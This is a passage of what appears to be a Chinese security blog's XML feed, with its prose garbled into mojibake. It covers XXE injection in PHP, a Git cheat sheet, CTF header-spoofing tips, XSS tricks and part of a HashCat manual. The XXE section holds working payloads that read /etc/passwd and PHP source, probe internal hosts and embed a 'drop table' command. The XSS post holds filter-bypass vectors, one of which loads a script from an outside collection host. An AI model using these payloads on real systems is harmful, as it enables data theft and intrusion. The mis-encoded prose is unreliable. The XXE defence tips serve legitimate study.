<p>å¯¹äºä¸åŒXMLè§£æå™¨,å¯¹å¤–éƒ¨å®ä½“æœ‰ä¸åŒå¤„ç†è§„åˆ™,åœ¨PHPä¸­é»˜è®¤å¤„ç†çš„å‡½æ•°ä¸º:</p>
<blockquote>
<p>xml_parseå’Œsimplexml_load</p>
</blockquote>
<p>xml_parseçš„å®ç°æ–¹å¼ä¸ºexpatåº“ï¼Œé»˜è®¤æƒ…å†µä¸ä¼šè§£æå¤–éƒ¨å®ä½“,è€Œsimplexml_loadé»˜è®¤æƒ…å†µä¸‹ä¼šè§£æå¤–éƒ¨å®ä½“,é€ æˆå®‰å…¨å¨èƒ.</p>
<p>é™¤PHPå¤–ï¼Œåœ¨Javaï¼ŒPythonç­‰å¤„ç†xmlçš„ç»„ä»¶åŠå‡½æ•°ä¸­éƒ½å¯èƒ½å­˜åœ¨æ­¤é—®é¢˜.</p>
<h1 id="0x03-è¯­æ³•"><a href="#0x03-è¯­æ³•" class="headerlink" title="0x03 è¯­æ³•"></a>0x03 è¯­æ³•</h1><p>ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š</p>
<pre><code>&lt;?php
$fileread = &lt;&lt;&lt;XML
&lt;!-- validators.en.xliff --&gt;
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file://C:/phpStudy/WWW/XXE/file.ext&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
XML;
$data = simplexml_load_string($fileread);
print_r($data);
?&gt;
</code></pre><p>å¦‚æœè¦å¼•ç”¨ä¸€ä¸ªå¤–éƒ¨èµ„æº,å¯ä»¥å€ŸåŠ©å„ç§åè®®ï¼Œè¿™é‡Œé€šè¿‡<code>file://</code> åè®®å¼•å…¥äº†å¤–éƒ¨å®ä½“.</p>
<pre><code>file:///path/to/file.ext
http://url/file.ext
php://filter/read=convert.base64-encode/resource=conf.php
</code></pre><p>ä¹Ÿå¯è¯»å–ç½‘ç«™å†…å®¹</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;http://byd.dropsec.xyz/robots.txt&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
</code></pre><p>é€šè¿‡ä¸Šé¢å¯ä»¥ç”¨æ¥å†…ç½‘æ¢æµ‹ï¼Œå¦‚æœå®‰è£…äº†expectæ‰©å±•ç»„ä»¶ç”šè‡³å¯ä»¥ç”¨æ¥è¿›è¡Œå†…ç½‘æ¸—é€ã€‚</p>
<p>å¦‚æœåŒ…å«æ–‡ä»¶å¤±è´¥,å¯èƒ½æ˜¯ç”±äºè¯»å–phpç­‰æ–‡ä»¶æ—¶æ–‡ä»¶æœ¬èº«åŒ…å«çš„&lt;ç­‰å­—ç¬¦.å¯ä»¥ä½¿ç”¨Base64ç¼–ç ç»•è¿‡,å¦‚:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
</code></pre><p>å†…éƒ¨å®ä½“çš„è¿™æ”¯æŒä¸å¦ä¹Ÿæ˜¯å–å†³äºè§£é‡Šå™¨çš„ã€‚ä¸åŒçš„æµè§ˆå™¨ä¸ä¸€æ ·ï¼Œä¸é€šè¯­è¨€é»˜è®¤ä¹Ÿä¸ä¸€æ ·ã€‚æ‰€ä»¥åˆ©ç”¨æ¯”è¾ƒå›°éš¾ã€‚</p>
<p>ä½†å®é™…ä¸ŠXMLå¤–éƒ¨å®ä½“çš„è§£æï¼Œå’Œphpç‰ˆæœ¬å¹¶æ— å…³ç³»ï¼Œè€Œæ˜¯å’Œç¼–è¯‘æ—¶çš„libxmlåº“ç‰ˆæœ¬æœ‰å…³ã€‚</p>
<h1 id="0x04-æ”»å‡»"><a href="#0x04-æ”»å‡»" class="headerlink" title="0x04 æ”»å‡»"></a>0x04 æ”»å‡»</h1><p>1.æ‹’ç»æœåŠ¡</p>
<p><a href="http://www.baidu.com/" target="_blank" rel="external">POC</a></p>
<p>2.å†…ç½‘ä¿¡æ¯</p>
<p>å€ŸåŠ©å„ç§åè®®å¦‚http,XXEå¯ä»¥ååŠ©æ‰«æå†…ç½‘,å¯èƒ½å¯ä»¥è®¿é—®åˆ°å†…ç½‘å¼€æ”¾WEBæœåŠ¡çš„Server,å¹¶è·å–å…¶ä»–ä¿¡æ¯.</p>
<pre><code>&lt;!ELEMENT portscan SYSTEM &apos;http://192.168.2.1/&apos; &gt;
&lt;!ELEMENT smb SYSTEM &apos;\\192.168.2.1\c$&apos; &gt;
&lt;!ELEMENT sql SYSTEM &apos;http://192.168.2.1/index.php?id=1;drop table myweb;#&apos; &gt;
</code></pre><p>3.æ–‡ä»¶è¯»å–</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE dropsec [
&lt;!ELEMENT methodname ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
&lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;
</code></pre><h1 id="0x05-é˜²å¾¡"><a href="#0x05-é˜²å¾¡" class="headerlink" title="0x05 é˜²å¾¡"></a>0x05 é˜²å¾¡</h1><p>1ã€å¯¹äºPHP,ç”±äºsimplexml_load_stringå‡½æ•°çš„XMLè§£æé—®é¢˜å‡ºåœ¨libxmlåº“ä¸Š,æ‰€ä»¥å¯ä»¥æå‰åŠ ä¸Š:</p>
<blockquote>
<p>&lt;?php libxml_disable_entity_loader(true); ?&gt;</p>
</blockquote>
<p>2ã€æ£€æŸ¥æ‰€ä½¿ç”¨çš„åº•å±‚xmlè§£æåº“ï¼Œé»˜è®¤ç¦æ­¢å¤–éƒ¨å®ä½“çš„è§£æ.</p>
<p>3ã€å¯¹äºXMLReaderå’ŒDOMæ–¹å¼è§£æ.</p>
<pre><code>&lt;?php 

// with the XMLReader functionality: 

$doc = XMLReader::xml($badXml,&apos;UTF-8&apos;,LIBXML_NONET); 

// with the DOM functionality: 

$dom = new DOMDocument(); 

$dom-&gt;loadXML($badXml,LIBXML_DTDLOAD|LIBXML_DTDATTR); 

?&gt;
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git å¸¸ç”¨å‘½ä»¤é€ŸæŸ¥è¡¨]]></title>
      <url>/2016/08/15/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      <content type="html"><![CDATA[<p>Git æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆæ²¡æœ‰ä¹‹ä¸€ï¼‰ã€‚<br>Gitæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿç®€å•æ¥è¯´å°±æ˜¯ï¼šé«˜ç«¯å¤§æ°”ä¸Šæ¡£æ¬¡ï¼</p>
<a id="more"></a>
<h1 id="0x01-åˆ†æ”¯"><a href="#0x01-åˆ†æ”¯" class="headerlink" title="0x01 åˆ†æ”¯"></a>0x01 åˆ†æ”¯</h1><p>master: é»˜è®¤å¼€å‘åˆ†æ”¯</p>
<p>Headï¼š é»˜è®¤å¼€å‘åˆ†æ”¯</p>
<p>originï¼š é»˜è®¤è¿œç¨‹ç‰ˆæœ¬åº“</p>
<p>head^ï¼š Headçš„çˆ¶æäº¤</p>
<h1 id="0x02-åˆ›å»ºç‰ˆæœ¬åº“"><a href="#0x02-åˆ›å»ºç‰ˆæœ¬åº“" class="headerlink" title="0x02 åˆ›å»ºç‰ˆæœ¬åº“"></a>0x02 åˆ›å»ºç‰ˆæœ¬åº“</h1><pre><code>$ git clone &lt;ur&gt;    #å…‹éš†è¿œç¨‹ç‰ˆæœ¬åº“
$ git init          #åˆå§‹åŒ–æœ¬åœ°ç‰ˆæœ¬åº“
</code></pre><h1 id="0x03-ä¿®æ”¹å’Œæäº¤"><a href="#0x03-ä¿®æ”¹å’Œæäº¤" class="headerlink" title="0x03 ä¿®æ”¹å’Œæäº¤"></a>0x03 ä¿®æ”¹å’Œæäº¤</h1><pre><code>$ git status                    #æŸ¥çœ‹çŠ¶æ€
$ git diff                      #æŸ¥çœ‹å˜æ›´å†…å®¹
$ git add .                     #è·Ÿè¸ªæ‰€æœ‰æ”¹åŠ¨è¿‡çš„æ–‡ä»¶
$ git add &lt;file&gt;                #è·Ÿè¸ªæŒ‡å®šæ–‡ä»¶
$ git mv &lt;old&gt; &lt;new&gt;            #æ–‡ä»¶æ”¹å
$ git rm &lt;file&gt;                 #åˆ é™¤æ–‡ä»¶
$ git rm --cached &lt;file&gt;        #åœæ­¢è·Ÿè¸ªæ–‡ä»¶ä½†ä¸åˆ é™¤
$ git commit -m &quot;commit message&quot;#æäº¤æ‰€æœ‰æ›´æ–°è¿‡çš„æ–‡ä»¶
$ git commit --amend            #ä¿®æ”¹æœ€åä¸€æ¬¡æäº¤
</code></pre><h1 id="0x04-æŸ¥çœ‹æäº¤å†å²"><a href="#0x04-æŸ¥çœ‹æäº¤å†å²" class="headerlink" title="0x04 æŸ¥çœ‹æäº¤å†å²"></a>0x04 æŸ¥çœ‹æäº¤å†å²</h1><pre><code>$ git log                       #æŸ¥çœ‹æäº¤å†å²
$ git log -p &lt;file&gt;             #æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„æäº¤å†å²
$ git blame &lt;file&gt;              #ä»¥åˆ—è¡¨æ–¹å¼æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„æäº¤å†å²
</code></pre><h1 id="0x05-æ’¤é”€"><a href="#0x05-æ’¤é”€" class="headerlink" title="0x05 æ’¤é”€"></a>0x05 æ’¤é”€</h1><pre><code>$ git reset --hard HEAD          #æ’¤é”€å·¥ä½œç›®å½•ä¸­æ‰€æœ‰æœªæäº¤æ–‡ä»¶çš„ä¿®æ”¹å†…å®¹
$ git checkout HEAD &lt;file&gt;       #æ’¤é”€æŒ‡å®šçš„æœªæäº¤æ–‡ä»¶çš„ä¿®æ”¹å†…å®¹
$ git revert &lt;commit&gt;            #æ’¤é”€æŒ‡å®šçš„æäº¤
</code></pre><h1 id="0x06-åˆ†æ”¯ä¸æ ‡ç­¾"><a href="#0x06-åˆ†æ”¯ä¸æ ‡ç­¾" class="headerlink" title="0x06 åˆ†æ”¯ä¸æ ‡ç­¾"></a>0x06 åˆ†æ”¯ä¸æ ‡ç­¾</h1><pre><code>$ git branch                    #æ˜¾ç¤ºæ‰€æœ‰æœ¬åœ°åˆ†æ”¯
$ git checkout &lt;branch/tag&gt;     #åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯æˆ–è€…æ ‡ç­¾
$ git branch &lt;new-nbranch&gt;      #åˆ›å»ºæ–°åˆ†æ”¯
$ git branch -d &lt;branch&gt;        #åˆ é™¤æœ¬åˆ†æ”¯
$ git tag                        #åˆ—å‡ºæ‰€æœ‰æœ¬åœ°æ ‡ç­¾
$ git tag &lt;tagname&gt;             #åŸºäºæœ€æ–°æäº¤åˆ›å»ºæ ‡ç­¾
$ git tag -d &lt;tagname&gt;          #åˆ é™¤æ ‡ç­¾
</code></pre><h1 id="0x07-åˆå¹¶ä¸è¡åˆ"><a href="#0x07-åˆå¹¶ä¸è¡åˆ" class="headerlink" title="0x07 åˆå¹¶ä¸è¡åˆ"></a>0x07 åˆå¹¶ä¸è¡åˆ</h1><pre><code>$ git merge &lt;branch&gt;            #åˆå¹¶æŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯
$ git rebase &lt;branch&gt;           #è¡åˆæŒ‡å®šåˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯
</code></pre><h1 id="0x08-è¿œç¨‹æ“ä½œ"><a href="#0x08-è¿œç¨‹æ“ä½œ" class="headerlink" title="0x08 è¿œç¨‹æ“ä½œ"></a>0x08 è¿œç¨‹æ“ä½œ</h1><pre><code>$ git remote -v                      #æŸ¥çœ‹è¿œç¨‹ç‰ˆæœ¬åº“ä¿¡æ¯
$ git remote show &lt;remote&gt;           #æŸ¥çœ‹æŒ‡å®šè¿œç¨‹ç‰ˆæœ¬åº“ä¿¡æ¯
$ git remote add &lt;remote&gt; &lt;url&gt;      #æ·»åŠ è¿œç¨‹ç‰ˆæœ¬åº“
$ git fetch &lt;remote&gt;                 #ä»è¿œç¨‹åº“è·å–ä»£ç 
$ git pull &lt;remote&gt; &lt;branch&gt;         #ä¸‹è½½ä»£ç åŠå¿«é€Ÿåˆå¹¶
$ git push &lt;remote&gt; &lt;branch&gt;         #ä¸Šä¼ ä»£ç åŠå¿«é€Ÿåˆå¹¶
$ git push &lt;remote&gt; :&lt;branch/tagname&gt;#åˆ é™¤è¿œç¨‹åˆ†æ”¯æˆ–æ ‡ç­¾
$ git push --tags                    #ä¸Šä¼ æ‰€æœ‰æ ‡ç­¾
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> Git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTFä¸­ä¸€äº›ç»•è¿‡ç½‘ç«™è®¿é—®é™åˆ¶çš„æŠ€å·§]]></title>
      <url>/2016/08/12/CTF%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>å¹³æ—¶è®¿é—®ç½‘ç«™æˆ–è€…åš CTF é¢˜çš„æ—¶å€™ä¼šé‡åˆ°ç½‘ç«™é™åˆ¶è®¿é—®çš„é—®é¢˜ï¼Œä¸‹é¢æ˜¯ä¸€äº›å°æŠ€å·§ï¼Œä¸»è¦æ˜¯é€šè¿‡ BurpSuite æ‹¦æˆª HTTP è¯·æ±‚å¹¶æ ¹æ®éœ€è¦ä¿®æ”¹ HTTP è¯·æ±‚å¤´çš„å†…å®¹æ¥è¾¾åˆ°ç»•è¿‡çš„ç›®çš„ã€‚</p>
<a id="more"></a>
<p>1ã€çœ‹èµ·æ¥åªå…è®¸å›½å¤–è®¿é—®ï¼Œæœ‰å¯èƒ½æ˜¯ HTTP è¯·æ±‚å¤´ä¸­çš„ Accept-Language ä¸ºä¸­æ–‡(cn-zh)ï¼Œä¿®æ”¹ä¸ºè‹±æ–‡(en-us)å³å¯</p>
<p>2ã€æµè§ˆå™¨ç±»å‹é™åˆ¶ï¼šä¿®æ”¹ HTTP è¯·æ±‚ä¸­çš„ User-Agent</p>
<p>3ã€IPåœ°å€é™åˆ¶ï¼šå¯èƒ½è·Ÿ HTTP è¯·æ±‚å¤´ä¸­çš„ X-Forwarded-Forã€client-ipã€remote_addr æœ‰å…³ï¼Œæˆ–è€…æŒ‚ä»£ç†ã€‚</p>
<p>4ã€éœ€è¦ç™»å½•ï¼Œå¯èƒ½æ˜¯ Cookie çš„é—®é¢˜ï¼Œå¦‚æœ Cookie æ¯”è¾ƒç®€å•ï¼Œè¯•è¯•èƒ½ä¸èƒ½æ„é€ ã€‚</p>
<p>5ã€å°è¯•æŸ¥çœ‹ robots.txt å¯ä»¥è·å¾—è¯¥ç½‘ç«™çš„ä¸€äº›ä¿¡æ¯ã€‚</p>
<p>6ã€æœ‰ä¸€äº›åŠ refereråŠ ä¸Šä»£ç†ipã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> çˆ¬è™« </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSSä¸€äº›å°æŠ€å·§]]></title>
      <url>/2016/08/12/XSS%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<p>1ã€<a href="http://www.wooyun.org/bugs/wooyun-2013-034003" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2013-034003</a></p>
<pre><code>&lt;textarea/&gt;&quot;&gt;&lt;img src=1 onerror=&quot;with(document)body.appendChild(createElement(String.fromCharCode(115,99,114,105,112,116))).src=&apos;//pxss.sinaapp.com/l6OBji&apos;&quot;&gt;

&lt;textarea/&gt;&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;
</code></pre><a id="more"></a>
<p>2ã€åªæœ‰æ•°æ®åŒ…ä¸­httpå¤´å«æœ‰X-XSS-Protectionå¹¶ä¸”å€¼ä¸º0çš„æ—¶å€™ï¼Œæµè§ˆå™¨æ‰ä¸ä¼šå¼€å¯xss filterã€‚</p>
<p>3ã€å¯ä»¥åˆ©ç”¨å­—ç¬¦ç¼–ç æ¥ç»•è¿‡XSS Filterçš„æ–¹æ³•ï¼Œå½“ç¼–ç æ˜¯is-2022-kræ—¶æµè§ˆå™¨ä¼šå¿½ç•¥%0fï¼Œè¿™æ ·æˆ‘ä»¬åœ¨onerroråé¢åŠ ä¸ª%0få°±èƒ½ç»•è¿‡filterï¼Œå‰ææ˜¯æ³¨å…¥ä¸€ä¸ª<code>&lt;meta charset=ISO-2022-KR&gt;</code></p>
<p>4ã€<code>&lt;iframe srcdoc=&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&gt;</code></p>
<p>ä¸æ˜¯ä»¥onå¼€å¤´çš„  åˆå¯ä»¥æ‰§è¡ŒJSçš„iframeå±æ€§ã€‚</p>
<p>5ã€</p>
<pre><code>&lt;a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&gt;aa&lt;/a&gt;
</code></pre><p>6ã€    </p>
<pre><code>&lt;a href=javascirpt:alert(1)&gt;è¯·ç‚¹å‡»&lt;/a&gt;
</code></pre><p>7ã€</p>
<pre><code>&lt;iframe/onload=alert(1)&gt;
</code></pre><p>8ã€</p>
<pre><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;
</code></pre><p>9ã€ä¸€äº›æœ‰è¶£çš„XSS Vector</p>
<pre><code>http://zone.wooyun.org/content/15121
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> XSS </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HashCatä½¿ç”¨æ‰‹å†Œ]]></title>
      <url>/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</url>
      <content type="html"><![CDATA[<h1 id="0x00-èƒŒæ™¯"><a href="#0x00-èƒŒæ™¯" class="headerlink" title="0x00 èƒŒæ™¯"></a>0x00 èƒŒæ™¯</h1><p>Hashcatæ˜¯ä¸€ä¸ªå·²ç»æœ‰è´´è¿‘å®Œç¾çš„å·¥ä½œå·¥å…·ï¼Œæ”¯æŒåƒâ€œPasswordsProâ€ï¼Œâ€œçº¦ç¿°å¼€è†›æ‰‹â€åŸºäºè§„åˆ™çš„æ”»å‡»ã€‚ç„¶è€Œï¼Œå¯¹äºä¸€äº›æœªçŸ¥çš„åŸå› ï¼Œä»–ä»¬ä¸¤ä¸ªä¸æ”¯æŒå¤šçº¿ç¨‹ã€‚è¿™æ˜¯å†™Hashcatçš„å”¯ä¸€ç†ç”±ï¼šä¸ºäº†åˆ©ç”¨ç°ä»£CPUçš„å¤šä¸ªæ ¸å¿ƒã€‚</p>
<a id="more"></a>
<h1 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h1><p>Hashcatæœ‰ä¸¤ä¸ªä¸»è¦çš„å˜ç§ï¼š</p>
<ul>
<li>1.Hashcat  åŸºäºCPUçš„å¯†ç æ¢å¤å·¥å…·</li>
<li>2.oclHashcat/cudaHashcat  ä¸€ä¸ªGPUåŠ é€Ÿå·¥å…·</li>
</ul>
<p>è®¸å¤šç”±Hashcatæ”¯æŒçš„ç®—æ³•å¯ä»¥åœ¨æ›´çŸ­çš„æ—¶é—´ï¼Œé€šè¿‡ä½¿ç”¨è¯æ®å……åˆ†çš„GPUåŠ é€Ÿè¢«ç ´è§£åœ¨oclHashcatï¼ˆå¦‚MD5ï¼ŒSHA1ï¼Œç­‰ç­‰ï¼‰åˆ©ç”¨ã€‚ç„¶è€Œï¼Œå¹¶éæ‰€æœ‰çš„ç®—æ³•å¯ä»¥é€šè¿‡åˆ©ç”¨GPUçš„åŠ é€Ÿã€‚Bcryptå°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ç”±äºç§ç§å› ç´ ï¼Œæ¯”å¦‚ä¾èµ–äºæ•°æ®çš„åˆ†æ”¯ï¼Œåºåˆ—åŒ–å’Œå†…å­˜ï¼ˆä»¥ä»…ä¸¾å‡ ä¾‹ï¼‰ï¼ŒoclHashcatä¸æ˜¯ä¸€ä¸ªåŒ…ç½—ä¸‡è±¡çš„æ›¿ä»£Hashcatã€‚<br>ä½¿ç”¨çš„è¯ï¼Œä½ç‰ˆæœ¬æç¤ºç‰ˆæœ¬è¿‡ä½çš„è¯ï¼Œæ”¹ä¸€ä¸‹æ—¶é—´å°±è¡Œäº†ï¼‰<br>ä½¿ç”¨Hashcatæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œä½¿ç”¨oclhashcatåˆ™å¿…é¡»æ»¡è¶³AMDï¼ˆçš„OpenCLï¼‰å’ŒNvidiaï¼ˆCUDAï¼‰ã€‚</p>
<h1 id="0x02-ç‰¹æ€§"><a href="#0x02-ç‰¹æ€§" class="headerlink" title="0x02 ç‰¹æ€§"></a>0x02 ç‰¹æ€§</h1><ul>
<li>Hashcatå¯ç”¨äºLinuxï¼ŒOSXå’ŒWindowsã€‚oclHashcatä»…é€‚ç”¨äºLinuxå’ŒWindows</li>
<li>ä¸–ç•Œæœ€å¿«çš„å¯†ç ç ´è§£</li>
<li>ä¸–ç•Œç¬¬ä¸€ä¸ªä¹Ÿæ˜¯å”¯ä¸€åŸºäºGPUè§„åˆ™å¼•æ“</li>
<li>è‡ªç”±</li>
<li>å¼€æº</li>
<li>å¤šGPUï¼ˆé«˜è¾¾128 GPUï¼‰çš„</li>
<li>å¤šæ•£åˆ—ï¼ˆé«˜è¾¾1äº¿æ•£åˆ—ï¼‰</li>
<li>å¤šæ“ä½œç³»ç»Ÿï¼ˆLinuxå’ŒWindowsæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</li>
<li>å¤šå¹³å°ï¼ˆOpenCLå’ŒCUDAæ”¯æŒï¼‰</li>
<li>å¤šç®—æ³•ä¸­ï¼ˆè§ä¸‹æ–‡ï¼‰</li>
<li>èµ„æºåˆ©ç”¨ç‡ä½ï¼Œä½ ä»ç„¶å¯ä»¥çœ‹ç”µå½±æˆ–ç©æ¸¸æˆè€Œç ´è£‚</li>
<li>é«˜åº¦é›†ä¸­è¿­ä»£ç°ä»£å“ˆå¸Œ</li>
<li>åŸºäºé‡ç‚¹å­—å…¸æ”»å‡»</li>
<li>æ”¯æŒåˆ†å¸ƒå¼å¼€è£‚</li>
<li>æ”¯æŒæš‚åœ / æ¢å¤è€Œå¼€è£‚</li>
<li>æ”¯æŒä¼šè¯</li>
<li>æ”¯æŒæ¢å¤</li>
<li>æ”¯æŒè¯»å–å•è¯æ–‡ä»¶</li>
<li>æ”¯æŒè¯»å–å­—æ ‡å‡†è¾“å…¥</li>
<li>æ”¯æŒå…­è§’ç›</li>
<li>æ”¯æŒåå…­è¿›åˆ¶å­—ç¬¦é›†</li>
<li>å†…ç½®åŸºå‡†ç³»ç»Ÿ</li>
<li>ç»¼åˆçƒ­çœ‹é—¨ç‹—</li>
<li>150+ç®—æ³•åœ¨è€ƒè™‘æ€§èƒ½çš„å®ç°</li>
</ul>
<h1 id="0x04-ä½¿ç”¨è¯´æ˜"><a href="#0x04-ä½¿ç”¨è¯´æ˜" class="headerlink" title="0x04 ä½¿ç”¨è¯´æ˜"></a>0x04 ä½¿ç”¨è¯´æ˜</h1><h2 id="ç ´è§£çš„hashç±»å‹"><a href="#ç ´è§£çš„hashç±»å‹" class="headerlink" title="ç ´è§£çš„hashç±»å‹"></a>ç ´è§£çš„hashç±»å‹</h2><p>ä½¿ç”¨ â€“help æŸ¥çœ‹ç ´è§£ç±»å‹</p>
<pre><code>900 = MD4
0 = MD5
5100 = Half MD5
100 = SHA1
10800 = SHA-384
1400 = SHA-256
1700 = SHA-512
5000 = SHA-3(Keccak)
10100 = SipHash
6000 = RipeMD160
6100 = Whirlpool
6900 = GOST R 34.11-94
11700 = GOST R 34.11-2012 (Streebog) 256-bit
11800 = GOST R 34.11-2012 (Streebog) 512-bit
10 = md5($pass.$salt)
20 = md5($salt.$pass)
30 = md5(unicode($pass).$salt)
40 = md5($salt.unicode($pass))
3800 = md5($salt.$pass.$salt)
3710 = md5($salt.md5($pass))
2600 = md5(md5($pass)
4300 = md5(strtoupper(md5($pass)))
4400 = md5(sha1($pass))
110 = sha1($pass.$salt)
120 = sha1($salt.$pass)
130 = sha1(unicode($pass).$salt)
140 = sha1($salt.unicode($pass))
4500 = sha1(sha1($pass)
4700 = sha1(md5($pass))
4900 = sha1($salt.$pass.$salt)
1410 = sha256($pass.$salt)
1420 = sha256($salt.$pass)
1430 = sha256(unicode($pass).$salt)
1440 = sha256($salt.unicode($pass))
1710 = sha512($pass.$salt)
1720 = sha512($salt.$pass)
1730 = sha512(unicode($pass).$salt)
1740 = sha512($salt.unicode($pass))
</code></pre><h2 id="ç ´è§£æ–¹å¼"><a href="#ç ´è§£æ–¹å¼" class="headerlink" title="ç ´è§£æ–¹å¼"></a>ç ´è§£æ–¹å¼</h2><pre><code>0 = Straight                 #ç›´æ¥å­—å…¸ç ´è§£
1 = Combination         #ç»„åˆç ´è§£
2 = Toggle-Case             #åˆ‡æ¢ä¸åŒæ–‡ä»¶ç ´è§£    
3 = Brute-force             #æ©ç æš´åŠ›ç ´è§£
4 = Permutation         #ç½®æ¢ç»„åˆç ´è§£
5 = Table-Lookup         #æŸ¥è¡¨ç ´è§£
8 = Prince    
</code></pre><h2 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h2><pre><code>General: 
  -m,  --hash-type=NUM              hashç±»å‹ï¼Œå¼•ç”¨ä¸Šæ–‡æ•°å­—
  -a,  --attack-mode=NUM            æ”»å‡»ç±»å‹ï¼Œå¼•ç”¨ä¸Šæ–‡æ•°å­—
  -V,  --version                      ç‰ˆæœ¬
  -h,  --help                        å¸®åŠ©æ–‡æ¡£
--quiet                       Suppress output

Misc:
--hex-salt                                ä»¥åå…­è¿›åˆ¶ç»™å‡º       
--hex-charset                             ä»¥å­—ç¬¦é›†ç»™å‡º    
--runtime=NUM                          è¿è¡Œnumæ—¶é—´åç»ˆæ­¢
--status                                 å¯ç”¨çŠ¶æ€
--status-timer=NUM                       å®šæ—¶å™¨
--status-automat                           çŠ¶æ€

Built-in charsets:  #è‡ªå®šä¹‰å­—ç¬¦é›†
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff

FIile:
  -oï¼Œ--outfile =æ–‡ä»¶ä¸­å®šä¹‰OUTFILEå·²æ¢å¤å“ˆå¸Œ
       --outfileæ ¼å¼= NUMå®šä¹‰æ¢å¤çš„æ•£åˆ—OUTFILEæ ¼å¼ï¼Œè¯·å‚é˜…ä¸‹é¢å¼•ç”¨
   --outfile-autohex-Disableç¦æ­¢ä½¿ç”¨$ HEX []è¾“å‡ºå¹³åŸ
  -pï¼Œ--separator = CHARå®šä¹‰hashlists / outfileä¸­åˆ†ç¦»ç‚­
       --showæ˜¾ç¤ºå¯†ç ç ´è§£åªï¼ˆè§--usernameï¼‰
       --leftåªï¼ˆè§--usernameï¼‰æ˜¾ç¤ºæœªå¼€è£‚çš„å¯†ç 
       --usernameå¯ç”¨hashfileç”¨æˆ·åå¿½ç•¥ï¼ˆæ¨èï¼šä¹Ÿä½¿ç”¨--showï¼‰
       ä¸€æ—¦å®ƒè¢«ç ´è§£--removeå¯ç”¨å“ˆå¸Œåˆ é™¤
       --stdoutæ ‡å‡†è¾“å‡ºæ¨¡å¼
       --potfileï¼Œç¦æ­¢ä¸å†™potfile
       --debugæ¨¡å¼= NUMï¼ˆä»…é€‚ç”¨äºé€šè¿‡ä½¿ç”¨è§„åˆ™çš„æ··åˆï¼‰å®šä¹‰è°ƒè¯•æ¨¡å¼ï¼Œ                                è§ä¸‹é¢çš„å‚è€ƒèµ„æ–™
       --debugæ–‡ä»¶=è°ƒè¯•è§„åˆ™æ–‡ä»¶çš„è¾“å‡ºæ–‡ä»¶ï¼ˆè§--debugæ¨¡å¼ï¼‰
